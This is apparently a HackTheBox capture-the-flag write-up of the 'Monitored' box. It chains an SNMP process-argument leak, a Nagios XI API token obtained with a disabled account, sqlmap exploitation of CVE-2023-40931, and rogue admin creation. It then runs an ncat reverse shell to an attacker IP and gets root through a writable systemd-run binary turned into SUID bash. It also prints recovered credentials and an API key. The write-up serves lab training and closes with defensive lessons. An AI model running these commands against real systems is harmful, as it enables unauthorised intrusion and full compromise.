---
title: "Monitored"
date: 2024-01-27
type: docs
tags:
  - htb
  - linux
  - medium
  - snmp
  - process-args-leak
  - nagios-xi
  - cve-2023-40931
  - sqli
  - sqlmap
  - api-abuse
  - writable-service
  - systemd
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Debian 12), **Difficulty:** Medium, **Released:** 2024-01-27, **IP:** `10.10.11.248` , `nagios.monitored.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. **SNMP** (161/udp) leaks a process command line that contains credentials: `svc : XjH7VCehowpR1xZB`.
2. The site is **Nagios XI**. The `svc` account is disabled for web login but still works against `POST /nagiosxi/api/v1/authenticate` to get an `auth_token`.
3. With the token, `admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=` is **SQL injectable** (**CVE-2023-40931**). sqlmap dumps `xi_users` and recovers the admin **`api_key`** (the bcrypt hash is not crackable, but the key is all you need).
4. Use the admin API key to **create a new admin user**, then use the Nagios XI configuration to define a **command / service** that runs an arbitrary shell command. Reverse shell as **`nagios`**.
5. `nagios` can write `/usr/local/nagios/bin/npcd`, which a root systemd service (`npcd.service`) executes. Replace it with a SUID bash script and restart the service. Root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| SNMP process args | `svc : XjH7VCehowpR1xZB` |
| Nagios XI admin `api_key` | `IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL` |
| `user.txt` | `/home/nagios/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Monitored is a chained Nagios XI box. The foothold is **SNMP leaking process arguments**: a cron runs `sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB`, and SNMP's `hrSWRunParameters` table exposes that command line to anyone who can query with the `public` community string. The web chain is a real CVE, **CVE-2023-40931**, an authenticated SQLi in the banner message helper, but the twist is that the disabled account still authenticates through the API, so you get a token even though the login page rejects you. From admin API key you build a Nagios "check command" that runs your shell. Root is a **writable binary invoked by a root systemd unit**, which is one of the most common Linux privesc patterns.

Related SNMP boxes: [Antique](/writeups/hackthebox/linux/easy/antique/) (JetDirect password in an OID). Related Nagios/monitoring N-day chains: [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/) (Cacti), [Cactus](/writeups/tryhackme/linux/easy/cactus/). Related writable service to root: [Bizness](/writeups/hackthebox/linux/easy/bizness/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Hack Smarter Security](/writeups/tryhackme/windows/medium/hack-smarter-security/).

---

## Full Walkthrough

### Recon

![Pasted image 20240131171759](Pasted-image-20240131171759.png)

when pasting the url into the browser we see a subdomain we need to add to `/etc/hosts` (`nagios.monitored.htb`). Default credentials on the Nagios login get nothing.

### SNMP leaks svc credentials

After a UDP scan I found SNMP open. Using nmap I retrieved process info and found what I believe to be credentials:

```bash
sudo nmap -Pn monitored.htb -p161 -sU -T5 --script=snmp-processes.nse -vv
```

```console
|   556:
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
```

(The full `snmp-processes` output is ~700 lines of kernel threads. Trimmed. The one line that matters is the `check_host.sh` command with the password on it.)

<div class="callout callout-note">

**SNMP process argument disclosure**

`snmpwalk -v2c -c public <host> 1.3.6.1.2.1.25.4.2.1.5` (`hrSWRunParameters`) lists the arguments of every running process. Any script started with a password on its command line (`./tool -p Secret123`, `mysql -pSecret`) is now readable by an unauthenticated SNMP client. This is why you pass secrets via env vars or files, not argv, and why default community strings must be changed. Also try `snmpbulkwalk` and `snmp-check` for installed software, listening ports, and mounted shares.

</div>

### Nagios XI, token via the API

```console
svc:XjH7VCehowpR1xZB
```

The `svc` account is disabled for the web UI, but the API still issues a token:

```bash
curl -X POST -k 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' \
  -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
```

### CVE-2023-40931, SQL injection in banner_message-ajaxhelper.php

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=<token>" \
  --level 5 --risk 3 -p id --batch --threads=10
```

```console
Parameter: id (GET)
    Type: boolean-based blind / error-based / time-based blind
    back-end DBMS: MySQL >= 5.0 (MariaDB fork)
available databases [2]: information_schema, nagiosxi
```

<div class="callout callout-note">

**CVE-2023-40931**

Nagios XI 5.11.0 to 5.11.1 does not parameterise the `id` parameter of `acknowledge_banner_message` in `banner_message-ajaxhelper.php`. It requires a valid session token (which you have from the API), then `id` flows straight into a SQL statement. The high value target is the `xi_users` table, specifically `api_key` for the `nagiosadmin` account, because that key lets you drive the whole admin API.

</div>

Dump the users:

```bash
sqlmap -u "...&token=<token>" -p id --batch -D nagiosxi --dump xi_users --no-cast
```

```console
| user_id | username    | api_key                                                          | password (bcrypt) |
| 1       | nagiosadmin | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | $2a$10$825c1eec... |
```

The admin hash is bcrypt (not worth cracking), so use the API key to make our own admin:

```bash
curl -k -X POST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudG...CHLL&pretty=1" \
  -d "username=baphomet&password=fuckedbybaphomet&name=nadmin&email=baphomet@monitored.htb&auth_level=admin"
# {"success": "User account baphomet was added successfully!"}
```

### RCE as nagios via a check command

Log in as the new admin. Under **Configure -> Core Config Manager -> Commands**, add a command whose command line is a reverse shell, then add a **Service** that uses it, and run "Check Command" (or apply configuration).

```
$USER1$/ncat 10.10.14.198 9001 -e /bin/bash
```

after we run the check command we get a shell as `nagios`. `user.txt` is here.

### Privilege Escalation, writable npcd

`linpeas` flags a root systemd unit calling a writable binary:

```console
/etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
```

```console
nagios@monitored:~$ sudo -l
User nagios may run the following commands:
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh
```

<div class="callout callout-note">

**Writable ExecStart + `sudo` service control = root**

`npcd.service` runs `/usr/local/nagios/bin/npcd` as root, and `nagios` can overwrite that file. `manage_services.sh` (runnable via `sudo`) lets `nagios` stop and start `npcd`. So replace the binary with a script and restart the service.

</div>

```bash
cat > /usr/local/nagios/bin/npcd <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /usr/local/nagios/bin/npcd
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
/bin/bash -p
cat /root/root.txt
```

(There is also an Ansible Vault secret in `/usr/local/nagiosxi/scripts/automation/ansible/.../secrets.yml`, but the `npcd` route is faster.)

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/nagios/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Never put secrets on a command line.** SNMP, `ps`, `/proc/<pid>/cmdline`, audit logs and shell history all expose argv. Use environment files with tight permissions.
- **Change SNMP community strings** and restrict SNMP to a management network.
- **A disabled account is not a revoked account** if other auth paths (API, LDAP, SSH) still accept it. Disable everywhere.
- **Patch Nagios XI** (CVE-2023-40931) and parameterise every query.
- **Root systemd units must not point at group or user writable binaries.** Audit every `ExecStart` path and its parent directories.

---

## Related Writeups

- **SNMP enumeration / leaks:** [Antique](/writeups/hackthebox/linux/easy/antique/)
- **Monitoring stack N-day (Cacti / Nagios):** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Cactus](/writeups/tryhackme/linux/easy/cactus/)
- **Authenticated SQLi with sqlmap and a token:** [PC](/writeups/hackthebox/linux/easy/pc/), [Usage](/writeups/hackthebox/linux/easy/usage/)
- **Writable service / ExecStart to root:** [Bizness](/writeups/hackthebox/linux/easy/bizness/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Hack Smarter Security](/writeups/tryhackme/windows/medium/hack-smarter-security/)

## References

- CVE-2023-40931 (Nagios XI SQLi) <https://outpost24.com/blog/nagios-xi-vulnerabilities/>
- SNMP process argument disclosure <https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp>
- Nagios XI API docs <https://support.nagios.com/kb/article/nagios-xi-understanding-the-api-2-114.html>
